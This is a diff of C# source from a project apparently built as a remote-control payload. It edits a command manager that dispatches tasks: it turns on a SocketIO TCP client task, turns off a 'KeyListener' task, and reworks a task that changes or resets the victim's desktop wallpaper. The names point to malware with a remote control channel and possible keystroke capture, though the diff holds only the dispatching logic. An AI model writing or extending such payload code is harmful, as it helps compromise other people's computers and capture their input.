@@ -40,11 +40,11 @@ namespace Payload.Command
         #endregion
         public Dictionary<Payload.Common.Config.EnumTask, TaskPack> TaskMap { get; private set; }
 
-        private void Init()
+        private void Init() // Task Mapping 
         {
             TaskMap = new Dictionary<Common.Config.EnumTask, TaskPack>();
-            //TaskMap.Add(Common.Config.EnumTask.TcpClient, new SocketIOClientFactory().CreateTaskPack());
-            TaskMap.Add(Common.Config.EnumTask.KeyListener, new DemorFactory().CreateTaskPack());
+            TaskMap.Add(Common.Config.EnumTask.TcpClient, new SocketIOClientFactory().CreateTaskPack());
+            //TaskMap.Add(Common.Config.EnumTask.KeyListener, new DemorFactory().CreateTaskPack());
         }
 
         public bool AddTaskPack(Common.Config.EnumTask _key, TaskPack _tp)
@@ -70,28 +70,24 @@ namespace Payload.Command
         public void AddWallpaperCmd(WallPaper.Mode _mode)
         {
             TaskPack taskPack;
-            bool init = false;
             taskPack = CommandManager.Instance.GetTaskPack(Common.Config.EnumTask.WallpaperEngine);
             if (taskPack == null)
             {
-                init = true;
                 taskPack = new Payload.Command.WallPaper.WallpaperEngineFactory().CreateTaskPack();
+                CommandManager.Instance.AddTaskPack(Common.Config.EnumTask.WallpaperEngine, taskPack);
             }
-            WallPaper.WallpaperEngineCommand weCmd = ((WallPaper.WallpaperEngineCommand)taskPack.Command);
-            weCmd.CurrentMode = _mode;
+            WallPaper.WallpaperEngineCommand wpeCmd = ((WallPaper.WallpaperEngineCommand)taskPack.Command);
+            wpeCmd.CurrentMode = _mode;
             switch (_mode)
             {
                 case WallPaper.Mode.AUTO:
-                    weCmd.SetWallpaper();
+                    wpeCmd.SetWallpaper();
                     break;
                 case WallPaper.Mode.RESET:
-                    weCmd.ResetWallpaper();
+                    wpeCmd.ResetWallpaper();
                     break;
             }
             taskPack.Start();
-
-            if (init)
-                CommandManager.Instance.AddTaskPack(Common.Config.EnumTask.WallpaperEngine, taskPack);
         }
 
         public void Run()
@@ -101,7 +97,7 @@ namespace Payload.Command
                 TaskPack _tp = taskPack.Value;
                 if (_tp.Mode.Equals(EnumTaskPackMode.ONCE) && _tp.Executed || _tp.Mode.Equals(EnumTaskPackMode.NONE))
                     continue;
-                if(_tp.Task!=null)
+                if (_tp.Task!=null)
                 if (!_tp.ShouldCallRun || _tp.Task.Status.Equals(TaskStatus.Running))
                     continue;
                 _tp.Start();
